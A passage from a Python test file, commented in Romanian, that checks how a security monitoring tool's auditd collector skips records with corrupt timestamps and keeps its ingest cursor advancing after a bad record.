    assert len(errors) == 1, [r.getMessage() for r in caplog.records]
    assert getattr(errors[0], "serial", None) == "8801", "serialul e ce găsește înregistrarea cu ausearch"


def test_an_unparsable_single_line_record_is_skipped_too(caplog):
    """Aceeași gaură, pe cealaltă cale: USER_AUTH și rudele.

    Liniile cu semantică de sine stătătoare nu trec prin corelator, deci
    prinderea de la grupuri nu le acoperă. O ștampilă imposibilă pe un
    USER_AUTH bloca lotul exact la fel.
    """
    good = ('type=USER_AUTH msg=audit(1754390500.000:9300): pid=1 uid=0 '
            'auid=4294967295 msg=\'op=PAM:authentication acct="root" '
            'addr=203.0.113.9 terminal=ssh res=failed\'')
    corrupt = good.replace("1754390500", "99999999999999999")

    with caplog.at_level("ERROR", logger="sentinel.collectors.auditd"):
        evs = parse_auditd_lines([corrupt, good])

    assert [e.action for e in evs] == ["auth_fail"], "linia stricată se sare, cea bună trece"
    assert len([r for r in caplog.records if r.levelname == "ERROR"]) == 1


# --- efectul măsurat acolo unde doare: cursorul de ingestie ----------------
def test_a_batch_with_an_invalid_record_still_advances_the_ingest_cursor(tmp_path, monkeypatch):
    """Cursorul blocat e paguba, nu evenimentul pierdut.

    `poll_once` avansează cursoarele DUPĂ inserare. O excepție la parsare iese
    înaintea amândurora, deci nu se scrie nimic și cursorul auditd rămâne pe
    aceeași poziție: la fiecare secundă se recitesc aceleași linii, se ridică
    aceeași excepție, iar ingestia stă pe loc până când rotația jurnalului
    trece peste înregistrare — pentru toate sursele, nu doar pentru auditd.

    Testul citește faptul, nu intenția: cursorul auditd primit de repository
    trebuie să se fi mutat, iar evenimentul valid din același lot să fi ajuns la
    inserare.
    """
    import asyncio
    from types import SimpleNamespace

    from sentinel.collectors import auditd, nginx_tail
    from sentinel.services import ingest_service

    audit_log = tmp_path / "audit.log"
    audit_log.write_text("", encoding="utf-8")
    _, cursor0 = nginx_tail.read_new_lines(str(audit_log), None)

    cfg = SimpleNamespace(ingest=SimpleNamespace(exclude_sources=()),
                          history=SimpleNamespace(skip_command_accounts=()))
    ingest = ingest_service.Ingest(cfg, db=None)      # db-ul e înlocuit mai jos
    ingest._audit_path = str(audit_log)
    ingest._audit_cursor = cursor0

    inserted: list = []
    cursors: dict[str, str] = {}

    async def fake_insert(db, events):
        inserted.extend(events)
        return len(events)

    async def fake_set_cursor(db, name, cursor, *, events_seen=0):
        cursors[name] = cursor

    monkeypatch.setattr(ingest_service.events_repo, "insert_batch", fake_insert)
    monkeypatch.setattr(ingest_service.events_repo, "set_cursor", fake_set_cursor)
    monkeypatch.setitem(auditd._WATCH_KEYS, "sentinel_viitor", "not_a_real_action")

    with audit_log.open("a", encoding="utf-8") as fh:
        fh.write("\n".join(BAD_KEY_GROUP + SUID_CHMOD) + "\n")

    n = asyncio.run(ingest.poll_once())

    assert n == 2, "ambele grupuri trebuie să ajungă în lot"
    assert "suid_change" in [e.action for e in inserted]
    assert cursors.get("auditd") not in (None, cursor0), (
        "cursorul auditd nu a avansat: turul următor recitește exact aceleași linii")
